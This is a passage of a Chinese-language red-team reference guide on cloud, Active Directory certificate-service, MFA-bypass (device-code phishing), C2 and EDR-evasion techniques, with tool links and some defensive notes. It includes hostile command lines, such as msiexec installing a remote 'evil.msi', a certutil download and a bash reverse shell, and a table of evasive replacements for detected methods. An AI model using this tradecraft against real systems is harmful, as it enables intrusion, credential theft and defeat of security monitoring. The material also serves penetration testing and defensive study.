- 备用隐蔽: eBPF失败时修改`/etc/ld.so.preload` → 加载`libld.so`恶意库
- C2激活: 模块2"Knock"使用XDP(eXpress Data Path)监听"Magic TCP SYN"包(特定window size=54321) → 仅收到魔术包时开放反向shell → 端口扫描无法发现
- 意义: eBPF不只是本地持久化工具，是**云原生横向移动**工具

**工具链**:
- [CDK](https://github.com/cdk-team/CDK)(含cgroup2-eBPF-bypass) / [kubeletctl](https://github.com/cyberark/kubeletctl) / [peirates](https://github.com/inguardians/peirates)
- 检测: [Tetragon](https://github.com/cilium/tetragon)(eBPF运行时安全) / [Falco](https://github.com/falcosecurity/falco)

### 13.2 Serverless攻击

- AWS Lambda: 冷启动注入(修改初始化Handler) / 环境变量泄露(云凭证) / 临时目录(`/tmp`)持久化 / Layer投毒(污染共享层)
- Azure Functions: Managed Identity滥用(函数继承的托管身份→访问Key Vault/Storage) / 函数密钥泄露
- 攻击链: `函数漏洞(RCE/SSRF) → 窃取云凭证(AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY) → AWS CLI横向到其他资源`

### 13.3 云IAM特权 escalation

**AWS**: `iam:PassRole+ec2:RunInstances` → 创建具有高权限角色的EC2 / sts:AssumeRole链 / Lambda函数执行角色滥用
**Azure**: Entra ID(Microsoft Graph) → 条件访问策略修改 / PIM滥用 / Managed Identity→Key Vault
**GCP**: Service Account密钥泄露 → 模拟SA → IAM策略修改

### 13.4 供应链攻击: CI/CD Pipeline

**攻击思路**(PackageGate 2026):
- **GitHub Actions投毒**: 恶意Action/Workflow → 窃取GITHUB_TOKEN/自定义secrets → 仓库代码注入
- **Dependency Confusion**: 内部包名 → 公开npm/PyPI注册同名包 → 版本号高于内部 → 自动拉取恶意包
- **Build Pipeline投毒**: 污染编译环境 → 产出含后门的构建产物(SolarWinds式攻击)
- **防御**: 锁定依赖版本 / 私有Registry / SBOM分析 / 签名验证

---

## 14. 现代C2演进

### 14.1 新一代C2框架

| 框架 | 特点 |
|------|------|
| Sliver | Go编写，模块化，社区活跃 |
| Brute Ratel C4 | 高规避性，专为红队设计 |
| Mythic | 平台化C2，支持多Agent |
| Havoc | 开源，支持间接系统调用 |
| Cobalt Strike 4.x | 仍然主流但特征化严重，需大量定制 |

### 14.2 C2流量伪装演进

- **GraphQL封装**: 将C2指令伪装为GraphQL API调用
- **WebRTC通道**: 利用WebRTC的P2P特性建立C2(穿透NAT/防火墙)
- **QUIC协议**: 基于UDP的加密传输，指纹识别困难
- **域前置演进**: CDN厂商收紧后转向HTTP/2多路复用/SNI伪造
- **Living-off-the-Land C2**: Teams/Slack/Discord/Telegram Bot/Google Drive作为C2通道

### 14.3 边缘设备植入

- VPN设备(Fortinet/Palo Alto/Ivanti) → 长期驻留 → 中间人流量
- 路由器植入 → 网络嗅探/DNS劫持
- 防火墙植入 → 规则篡改/流量放行

---

## 15. 高级规避技术

### 15.1 Sleep Obfuscation(内存加密休眠)

> 核心思想: Beacon空闲时加密自身内存(RW状态) → EDR内存扫描只能看到加密数据 → 定时器/APC触发解密(RWX) → 执行任务 → 再次加密。EDR扫描时看到的永远是加密内存。

**三大主流实现原理对比**:

| 技术 | 触发机制 | 核心API | 原理 |
|------|---------|---------|------|
| **Ekko** | Timer Queue | CreateTimerQueueTimer + NtContinue | 链式Timer回调: Timer1→修改内存为RW+加密 → Sleep → Timer2→解密+修改为RX+继续执行。所有回调通过NtContinue传递伪造线程上下文 |
| **Foliage** | APC | NtQueueApcThread + NtContinue | 在工作线程上排队一系列APC: APC1→加密内存+RW → APC2→Sleep → APC3→解密+RX+恢复执行。每个APC传递不同的线程上下文 |
| **Zilean** | Wait Object | RegisterWait + NtContinue | Ekko变体，使用RegisterWait回调替代Timer Queue |
| **Hypnus** | 多模式 | TpSetTimer/TpSetWait/NtQueueApcThread | Rust实现，三大模式+调用栈伪装+堆加密。动态注册CFG(控制流防护)目标 |

**实际攻击流程(Ekko为例)**:
```
1. CreateTimerQueueTimer注册回调 → 指向NtContinue(带伪造CONTEXT)
2. 回调触发: VirtualProtect(payload, RW) → SystemFunction032(RC4加密)
3. Sleep(等待时间)
4. 第二个Timer触发: SystemFunction032(RC4解密) → VirtualProtect(payload, RX)
5. NtContinue恢复原始线程上下文 → 继续执行Beacon
6. 循环
```

**检测与对抗**:
- **Hunt-Sleeping-Beacons(HSB)**: 枚举定时器+分析回调地址是否指向NtContinue → 发现Sleep Obfuscation
- **EkkoMod绕过HSB**: Timer回调指针指向NtContinue前8字节(nop指令`0F 1F 84 00 00 00 00 00`) → 执行时nop→NtContinue → HSB不识别为NtContinue回调
- **Stack Duplication**: 复制线程的寄存器+栈(包含返回地址) → 休眠时调用栈看起来像正常回调线程 → 避免栈包含NtSignalAndWaitForSingleObject的IOC
- **Module Stomping配合**: 将payload加载到合法DLL的内存区域 → 内存看起来属于合法模块 → 避免unbacked memory检测
- **内存状态转换**: 安全做法是RW↔RX(不经过RWX) → Havoc的Sleep Mask使用RWX容易被EDR标记

**Linux Sleep Obfuscation(SilentPulse)**:
- 2025年出现Linux版本: 使用POSIX timer_create + SIGEV_THREAD → 回调中加密/解密
- 面临类似挑战: 栈分析可检测 → 需要类似Stack Duplication的规避
- 工具: [Ekko](https://github.com/Cracked5pider/Ekko)(已归档) / [Hypnus](https://github.com/dmore/hypnus-stealthy-dynamic-obfuscation-sleep-mem-obfuscation-rust-red)(Rust推荐)

### 15.2 间接系统调用演进

**从直接到间接系统调用的进化**:
- **直接系统调用(Direct Syscall)**: 在自己的代码中硬编码syscall指令 → EDR通过调用栈分析发现syscall不在ntdll中 → 检测
- **间接系统调用(Indirect Syscall)**: 在ntdll中找到`syscall; ret`指令地址 → jmp到该地址执行 → 调用栈显示返回地址在ntdll内 → 合法
- **Tartarus' Gate**: 运行时随机化syscall stub地址 → 每次执行stub不同 → 避免硬编码特征
- **HalosGate/TartarusGate**: ntdll被hook时(前几条指令被改为jmp) → 搜索相邻syscall stub → 跳过hook找到干净stub
- **Mockingjay**: 不需要ntdll! 在已加载的合法DLL中搜索`syscall; ret`指令序列 → 完全不涉及ntdll → 无ntdll hook可检测
- **RecycledGate**: 在已加载DLL中搜索syscall指令序列 → 更通用化的Mockingjay

**API Hashing(工具层面)**:
- 不使用GetModuleHandle+GetProcAddress(会被监控) → 手动实现模块遍历+函数名hash匹配 → 完全规避API监控
- 实战: [toxoglosser](https://github.com/killvxk/toxoglosser-umpolungfish)使用GetModuleHandle+GetProcAddress via hashing + Tartarus' Gate + 无LazyDLL

### 15.3 ETW/AMSI绕过演进

**ETW Patching**(事件跟踪):
- 方式1: 修改EtwEventWrite入口为`ret 0`(直接返回) → 所有ETW事件静默丢弃
- 方式2: 更底层Patch → 修改ntdll!EtwEventWrite的前几字节 → 不触发内存保护
- 检测: EDR检查ntdll内存完整性 → 需要在Patch后恢复或使用硬件断点替代

**AMSI Bypass**(反恶意软件扫描接口):
- 方式1: Patch AmsiScanBuffer/AmsiScanString入口为直接返回 → 所有内容扫描返回"干净"
- 方式2: 硬件断点Hooking → DR寄存器设置断点在AmsiScanBuffer → 不修改内存 → 更隐蔽
- 方式3: CLM(Constrained Language Mode)绕过 → PowerShell受限模式下绕过执行策略
- 进化: 从`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`这种特征明显的脚本 → 到C# inline编译或直接系统调用级别的Patch

### 15.4 注入技术演进

**模块踩踏(Module Stomping)**:
- 原理: 加载一个合法DLL → 将其内存内容覆盖为恶意payload → 内存看起来属于合法DLL
- 优势: 避免unbacked memory(无 backing 文件的内存) → EDR常见的内存扫描IOC失效
- 实战: 选择不常用的系统DLL踩踏 → 减少被检查概率

**映射注入(Map Injection)**:
- 原理: 手动解析PE → 分段映射到目标进程 → 不使用LoadLibrary → 无模块加载事件
- 优势: 不触发DllMain通知 → 不出现在模块列表中

**早期APC注入(Early Bird)**:
- 原理: 创建挂起进程 → QueueUserAPC注入 → ResumeThread → APC在主线程初始化前执行
- 优势: 在EDR的hook安装前就完成注入 → 绕过进程创建监控

**硬件断点注入**:
- 原理: 使用DR0-DR3寄存器设置硬件断点 → 不修改任何代码内存 → 在断点触发时执行恶意逻辑
- 优势: 无内存修改 → EDR的完整性检查无法发现

---

## 16. 最新AD/基础设施攻击

### 16.1 ADCS攻击演进(ESC1-ESC16完整攻击思路)

> ADCS(Active Directory Certificate Services)是域内最强大的提权路径之一。从ESC1到ESC16，每个编号代表一种独立的攻击面。

**攻击分类全景**:

| ESC# | 类型 | 核心原理 | 利用思路 |
|------|------|---------|---------|
| ESC1 | 模板配置错误 | 模板允许请求者自定义SAN(Subject Alternative Name) | 低权限用户注册证书时指定`SAN=域管` → 用该证书认证 → 获取域管TGT |
| ESC2 | EKU过宽 | 模板Any Purpose EKU → 可用于任何目的 | 类似ESC1但不需要Client Authentication EKU |
| ESC3 | 注册代理 | 存在注册代理EKU的模板 → 可代表其他用户注册 | 两阶段: 先注册代理证书 → 再用代理证书为目标用户注册认证证书 |
| ESC4 | 模板ACL可控 | 对模板有写权限 | 修改模板配置→使其变成ESC1 → 然后按ESC1利用 |
| ESC5 | CA ACL可控 | 对CA对象有控制权 | 直接控制CA → 可批准任何请求/修改任何模板 |
| ESC6 | CA级别SAN | CA启用EDITF_ATTRIBUTESUBJECTALTNAME2 | 任何模板都可以指定SAN → 直接伪造域管证书(2022.05补丁后需配合ESC10) |
| ESC7 | CA管理权限 | ManageCA/ManageCertificates权限 | 启用已禁用模板/任命自己为Certificate Officer/直接批准pending请求 |
| ESC8 | NTLM Relay | Web Enrollment启用 | PetitPotam强制DC认证 → Relay到AD CS HTTP端点 → 以DC身份注册证书 → DC Sync |
| **ESC9** | 无安全扩展 | 模板不包含`szOID_NTDS_CA_SECURITY_EXT`(SID安全扩展) | 配合GenericWrite权限: 修改目标用户UPN为域管UPN → 注册证书 → 恢复原UPN → 用证书认证为域管 |
| **ESC10** | 弱证书映射 | DC的`StrongCertificateBindingEnforcement=0/1` | 类似ESC9但利用DC级别配置 → Schannel UPN映射无需SID验证。⚠2025.09后Full Enforcement成唯一选项 |
| **ESC11** | RPC Relay | ICPR端点未强制加密(`IF_ENFORCEENCRYPTICERTREQUEST`未设置) | 类似ESC8但目标是RPC端点 → NTLM Relay到RPC → 以被Relay的身份注册证书 |
| **ESC12** | 外部密钥 | CA私钥存储在外部设备(YubiHSM)且注册表中有明文认证密码 | 获取CA服务器Local Admin → 从注册表提取YubiHSM密码 → 离线伪造任意证书 |
| **ESC13** | OID组链接 | 证书模板的发布策略(Issuance Policy)OID链接到AD组 | 注册带特定OID策略的证书 → 自动获得链接AD组的成员权限(可能就是Domain Admins) |
| **ESC14** | altSecurityIdentities | 用户/计算机账户的显式证书映射配置弱 | 修改目标的altSecurityIdentities指向攻击者控制的证书 → 冒充目标 |
| **ESC15** | EKUwu CVE-2024-49019 | V1模板的CSR中`msPKI-Application-Policy`可覆盖模板EKU | **内置WebServer模板是V1模板** → 请求时覆盖为Client Authentication EKU → 用Web Server证书做域认证。每个ADCS安装都有WebServer模板 |
| **ESC16** | 全局安全扩展移除 | CA级别禁用安全扩展 | 移除全局SID嵌入 → 所有证书都不含SID → 回退到弱UPN映射 |

**实战攻击决策树**:
```
1. 有网络位置(未认证)? → ESC8(HTTP Relay) / ESC11(RPC Relay)
2. 有域用户权限? → 检查可注册模板(ESC1/ESC2/ESC3)
3. 有模板写权限? → ESC4(改模板为ESC1)
4. 有GenericWrite? → ESC9(UPN篡改)
5. 有CA服务器Local Admin? → ESC5/ESC12(提取私钥)
6. 有ManageCA? → ESC7(启用模板+任命Officer)
```

**工具**: [Certify](https://github.com/GhostPack/Certify)(C#) / [Certipy](https://github.com/ly4k/Certipy)(Python，推荐) / [ADCSKiller](https://github.com/grimlockx/ADCSKiller)(自动化)
**检测**: [BloodHound](https://github.com/SpecterOps/BloodHound)(ADCS边支持ESC1-ESC10)

**重要时间线**:
- 2025.02: Microsoft Full Enforcement默认开启(`StrongCertificateBindingEnforcement=2`)
- 2025.09: Compatibility Mode永久移除，Full Enforcement成唯一选项 → ESC9/ESC10窗口关闭
- 2024.11: ESC15(CVE-2024-49019)补丁发布 → V1模板Application Policy覆盖被修复

### 16.2 Shadow Credentials攻击

- 利用`msDS-KeyCredentialLink`属性添加自控密钥→PKINIT→获取TGT
- 前提: 目标对象可写 + Windows Server 2016+域功能级别
- 工具: [Whisker](https://github.com/eladshamir/Whisker) / [PyWhisker](https://github.com/ShutdownRepo/pywhisker)

### 16.3 重大基础设施CVE(2024-2026)

| CVE | 产品 | 影响 |
|-----|------|------|
| CVE-2024-3400 | Palo Alto GlobalProtect | 任意命令执行(无需认证) |
| CVE-2024-21762 | Fortinet FortiOS | Out-of-Bound Write RCE |
| CVE-2023-46805/48788 | Ivanti Connect Secure | 认证绕过+RCE |
| CVE-2024-29847 | Ivanti EPM | SQL注入→RCE |
| CVE-2024-23897 | Jenkins | 任意文件读取通过CLI |
| CVE-2024-1709 | ConnectWise ScreenConnect | 认证绕过 |
| CVE-2025-22788 | - | Windows提权(新增) |

### 16.4 Linux后渗透新增

**eBPF Rootkit**: 利用eBPF程序在内核层拦截/修改系统调用→隐藏进程/文件/网络连接
- 工具: [TripleCross](https://github.com/h3xduck/TripleCross) / [ebpfkit](https://github.com/Gui774ume/ebpfkit)

**K8s攻击框架**: [kube-hunter](https://github.com/aquasecurity/kube-hunter) / [kube-bench](https://github.com/aquasecurity/kube-bench) / [checkov](https://github.com/bridgecrewio/checkov)

---

## 17. 初始访问演进

### 17.1 MFA绕过新技术(含FIDO绕过)

#### Device Code Phishing — 绕过所有MFA包括FIDO的终极手法

> 这是2025-2026最具颠覆性的初始访问技术。用户在真实的Microsoft/Google页面完成认证，MFA正常触发，但Token交给了攻击者。

**攻击原理(OAuth Device Authorization Grant滥用)**:
```
OAuth Device Code Flow设计初衷: 为输入受限设备(智能电视/CLI工具)设计
  → 用户在另一设备上访问 microsoft.com/devicelogin → 输入短代码 → 完成认证 → 原设备获得Token

攻击者滥用:
  1. 攻击者启动Device Code Flow(调用微软API) → 获得 device_code + user_code
  2. 诱导受害者访问 microsoft.com/devicelogin → 输入user_code
  3. 受害者在真实的Microsoft登录页完成认证(包括MFA/FIDO)
  4. 攻击者通过轮询token端点 → 获得Access Token + Refresh Token
  5. 受害者被重定向到合法占位页面(DocuSign/Google/Microsoft) → 浑然不觉
```

**为什么能绕过FIDO(2025.04突破性发现 by Dennis Kniep)**:
- FIDO的设计假设: 用户只在**自己发起**的认证会话中使用安全密钥 → 钓鱼网站无法伪造合法域名 → FIDO绑定origin
- Device Code的漏洞: 用户确实在**真实的Microsoft页面**完成认证 → FIDO安全密钥看到的是合法origin → 正常完成验证
- **问题不在认证本身，而在"授权了什么"**: 用户以为在给自己设备授权，实际在给攻击者的session授权

**EvilTokens PhaaS(2026.04 Microsoft披露的大规模攻击活动)**:
- **AI增强**: LLM生成超个性化邮件(RFP/发票/制造业工作流主题)
- **动态Code生成**: 传统攻击在邮件中放预生成code → 15分钟后过期。新方法在用户**点击链接时**才启动flow → 无过期问题
- **自动化填入**: 无头浏览器在后台自动将生成的code填入microsoft.com/devicelogin → 用户只需点击链接 → 自动跳转到认证页 → 无需手动输入code
- **使用Intune Company Portal的ClientID**: 可绕过Intune合规设备Conditional Access策略

**攻击后利用(获取Token后)**:
```
Access Token → 访问M365(邮件/SharePoint/Teams)
Refresh Token → 长期有效(90天) → 持续访问
→ 注册新设备到Entra ID → 获取PRT(Primary Refresh Token)
→ PRT实现整个M365环境的SSO → 横向到所有云资源
→ ⚠ 重置密码不会撤销Refresh Token！必须显式撤销所有session和token
```

**实战工具**: [DeviceCodePhishing](https://github.com/denniskniep/DeviceCodePhishing) — 自动化整个流程

**防御**:
- 在Entra ID Conditional Access中**禁用Device Authorization Grant Flow**(最有效)
- "Client App Condition"必须包含"Other clients"并阻止
- 监控sign-in日志中的`authenticationProtocol=deviceCode`事件
- 事件响应: 不要只重置密码 → 必须撤销所有Refresh Token和活跃session → 检查新注册设备

#### Token Theft(令牌窃取)

**Entra ID PRT窃取**: 获取Primary Refresh Token → Pass-the-PRT → 无需密码/MFA即可访问整个M365
- 工具: [ROADtools](https://github.com/dirkjanm/ROADtools) / [AADInternals](https://github.com/Gerenios/AADInternals)

**OAuth Token窃取**: 窃取已认证session的Access Token/Refresh Token → Refresh Token可长期使用(90天+)
- 检查: 是否有异常的OAuth应用授权/新设备注册

#### MFA Fatigue Attack升级
- 连续推送MFA验证直到用户疲劳点击批准
- 新变种: AI模拟合法请求模式/分散时间避免触发频率限制

#### Evilginx演进
- 中间人代理 → 窃取session cookie → 绕过MFA
- 支持更多SaaS应用phishlet
- 与Device Code相比: Evilginx需要伪造域名(可被检测)，Device Code在真实域名操作(更隐蔽)

### 17.2 QR Code Phishing (Quishing)

- 将钓鱼URL编码为二维码 → 邮件/社交媒体中发送
- 优势: 安全网关不扫描二维码内容 / 移动端安全防护较弱
- 结合AI生成场景化二维码(停车场缴费/快递取件/会议室签到)

---

## 18. Cloud Post-Exploitation

### 18.1 Azure/Entra ID攻击路径

- 获取Global Admin → 重置服务管理员密码 → 访问所有订阅
- Conditional Access Policy绕过(IP信任/设备信任)
- Managed Identity滥用 → 访问Azure Key Vault/Storage
- Azure AD Connect同步账户 → DC Sync
- 工具: [ROADtools](https://github.com/dirkjanm/ROADtools) / [AADInternals](https://github.com/Gerenios/AADInternals)

### 18.2 AWS Post-Exploitation

- EC2 Instance Metadata → IAM凭证窃取 → AWS CLI横向
- S3 Bucket枚举/数据窃取
- Lambda函数注入/修改
- CloudTrail日志篡改/规避
- 工具: [Pacu](https://github.com/RhinoSecurityLabs/pacu) / [CloudSploit](https://github.com/aquasecurity/cloudsploit) / [ScoutSuite](https://github.com/nccgroup/ScoutSuite)

### 18.3 M365 exploitation

- Exchange Online: OAuth应用滥用 / 邮件规则后门
- SharePoint/OneDrive: 文件窃取 / 权限提升
- Teams: 消息钓鱼 / 文件共享滥用
- 工具: [MicroBurst](https://github.com/NetSPI/MicroBurst) / [o365recon](https://github.com/nyxgeek/o365recon)

---

## 19. HW/红蓝对抗实战专题

### 19.1 HW打点方法论

**目标选择优先级**: 边界设备(VPN/防火墙/邮件网关) > OA系统(泛微/用友/致远) > 中间件(WebLogic/Tomcat/Struts2) > CMS系统 > 边缘资产(测试站/废弃系统)

**快速突破链**:
```
信息收集(子域名/端口/CMS识别) → 已知CVE快速验证 → 弱口令爆破(后台/数据库/SSH)
→ 代码审计(源码泄露/备份文件) → 框架漏洞(Struts2/WebLogic/Spring) → GetShell
→ 内网渗透(域/非域) → 权限维持 → 目标达成
```

**HW常见打点入口**:
| 入口 | CVE/手法 |
|------|---------|
| 泛微OA | e-cology RCE / e-mobile OGNL注入 |
| 用友OA | 用友NC/GRP / U8Cloud / 漏洞链 |
| 致远OA | A8/A6系列历史漏洞 |
| 蓝凌OA | EKP漏洞 |
| WebLogic | T3/IIOP反序列化 / Console RCE |
| Confluence | CVE-2023-22527(模板注入) / OGNL注入 |
| Nacos | 未授权访问 / Derby SQL注入RCE |
| Apache Shiro | 反序列化(CBC/GCM) |
| Spring | Spring4Shell(CVE-2022-22965) / Spring Cloud Gateway RCE |

### 19.2 HW防守方检测

**流量检测**: Suricata/Snort规则 / 全流量分析(PCAP) / JA3/JA3S TLS指纹
**终端检测**: EDR告警分析 / Sysmon日志 / Windows事件日志(4624/4688/4672)
**行为分析**: 异常登录(时间/地点/IP) / 横向移动特征(445/WMI/RPC) / 凭证使用模式
**蜜罐**: HFish / 蜜罐集群(诱饵资产/诱饵凭证/诱饵文件)

---

## 20. 零信任环境绕过

### 20.1 Zero Trust Architecture (ZTA) 绕过

**ZTNA网关绕过**:
- 窃取已认证设备证书 → 设备模拟
- Session Token窃取/重放
- 利用信任的SaaS应用作为跳板
- DNS隧道绕过流量策略

**Identity-Based攻击**:
- 凭证窃取 → 身份伪装(合法身份/非法行为)
- OAuth滥用 → 应用权限过大
- 条件访问策略绕过(合规设备→非合规设备迁移session)

### 20.2 XDR/MDR绕过

**XDR检测规避**:
- Living off the Land工具链(完全使用系统自带工具)
- 无文件攻击(纯内存执行)
- 分段延时操作(降低行为关联度)
- 利用合法远程管理工具(TeamViewer/AnyDesk/ScreenConnect)
- 反遥测: Patch ETW / WMI Event消费者隐藏

---

## 21. OT/ICS工控安全

### 21.1 工控网络攻击面

**IT/OT边界突破**: 利用DMZ区弱点→跳跃到OT网络 / 工控协议(Modbus/S7/CIP)无认证
**HMI攻击**: 人机界面Web化后的Web漏洞
**PLC攻击**: 固件篡改 / 逻辑注入 / 拒绝服务
**SCADA攻击**: 历史数据库泄露 / 远程管理接口漏洞

**工具**: [plcscan](https://github.com/yaniv571/plcscan) / [ISF(Industrial Security Framework)](https://github.com/dark-lbp/isf)

---

## 22. 移动端攻击

### 22.1 移动端间谍软件

**Android**:
- Pegasus级间谍软件(零点击漏洞链) → 无需用户交互即可接管
- 侧载恶意APP / Google Play审核绕过
- 利用Accessibility Service窃取凭证/键盘记录
- 工具: [Frida](https://github.com/frida/frida) / [Objection](https://github.com/sensepost/objection) / [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

**iOS**:
- TriangleDB / Predator 等商业间谍软件
- iMessage零点击(ForcedEntry/BlastDoor绕过)
- 越狱后持久化 / 配置文件(MDM)滥用
- Forensics: [iLEAPP](https://github.com/abrignoni/iLEAPP) / [Cellebrite]

### 22.2 移动端渗透

- APK反编译(jadx/Ghidra) → 硬编码API密钥/内网地址
- SSL Pinning绕过(Frida/Objection)
- API接口测试(抓包后测试后端)
- MDM配置文件钓鱼

---

## 23. Living off the Land (LotL) 攻击链

> 利用目标系统自带工具完成攻击，无需投放额外二进制文件，极大规避EDR/AV检测。

### 23.1 Windows LotL工具链

| 工具 | 用途 |
|------|------|
| PowerShell | 下载执行/信息收集/凭证操作(已过时?用C# AMSI Bypass替代) |
| WMI | 远程命令执行/信息收集/持久化 |
| certutil | 远程下载(`certutil -urlcache -split -f`) |
| mshta | 执行HTA/JavaScript |
| msiexec | 安装远程MSI(`msiexec /q /i http://xxx/evil.msi`) |
| msbuild | 执行内联C#(`msbuild.exe xxx.csproj`) |
| csc.exe | 本地编译C#(不依赖Visual Studio) |
| rundll32 | 加载DLL/执行JavaScript |
| forfiles | 代理执行(`forfiles /p c:\ /m notepad.exe /c "cmd /c evil"`) |
| psexec | 远程执行(Sysinternals) |
| schtasks | 计划任务持久化 |
| reg | 注册表操作/持久化 |
| wmic | 远程WMI命令执行 |
| bitsadmin | 后台下载 |
| installutil | .NET应用安装→执行代码 |

### 23.2 Linux LotL工具链

| 工具 | 用途 |
|------|------|
| curl/wget | 下载payload |
| bash -i | 反弹shell |
| python/perl/ruby | 一行执行器 |
| awk | 命令执行(`awk 'BEGIN{system("id")}'`) |
| find | 命令执行(`find / -exec cmd \;`) |
| xxd/base64 | 编解码 |
| ssh -R/-L | 隧道/端口转发 |
| crontab | 持久化 |
| systemctl | 服务创建/持久化 |

---

## 24. 过时内容警告与替代方案

> 以下技术/工具在2026年已过时或被防御方重点覆盖，需要使用新替代方案。

### 24.1 过时技术

| 过时技术 | 问题 | 替代方案 |
|---------|------|---------|
| PowerShell直接执行 | AMSI/CLM/Script Block Logging全面覆盖 | C# inline编译(msbuild) / 直接系统调用 / BOF |
| 传统DLL注入(CreateRemoteThread) | EDR对注入行为检测成熟 | 模块踩踏(Module Stomping) / 映射注入(Map Injection) / 早期APC注入 |
| Meterpreter默认payload | 特征被全面标记 | 自定义Reflective Loader / 独立RAT |
| 硬编码C2 IP | 快速被标记封禁 | 域前置/CDN/LotL C2/社交媒体C2 |
| 明文HTTP C2 | 流量检测全覆盖 | TLS 1.3/QUIC/域前置/WebSocket |
| mimikatz直接执行 | EDR重点监控 | Pypykatz /间接内存读取/LSASS Shtinkering / PPLFault |
| psexec横向 | 日志特征明显(4624 Type 3) | WMI / DCOM / WinRM / SCShell(RPC) |
| 传统社工邮件 | 邮件网关检测成熟 | AI个性化邮件/Deepfake语音/QR钓鱼/Device Code |
| Flash钓鱼 | Flash已停止支持 | Chrome更新钓鱼/Office更新钓鱼/安全软件激活钓鱼 |

### 24.2 需关注的防御演进

**Windows Defender演进(2025-2026)**:
- Microsoft Defender for Endpoint: EDR+XDR整合 / 云AI分析 / 自动调查响应
- Microsoft Defender for Identity: AD行为分析 / 横向移动检测 / 凭证攻击检测
- ASR(Attack Surface Reduction)规则: 阻止Office创建进程/阻止凭据窃取/阻止进程注入
- Controlled Folder Access: 防止勒索软件文件加密

**EDR检测演进**:
- 内存扫描频率提升 → Sleep加密成为必须
- ETW-based检测 → ETW Patching成为标准操作
- Kernel Callback → 白驱动致盲/回调修改
- 行为链分析 → 分段/延时操作
- Cloud ML → 多维度关联分析 → 需要更自然的操作模式

<!-- /redteam-reference -->
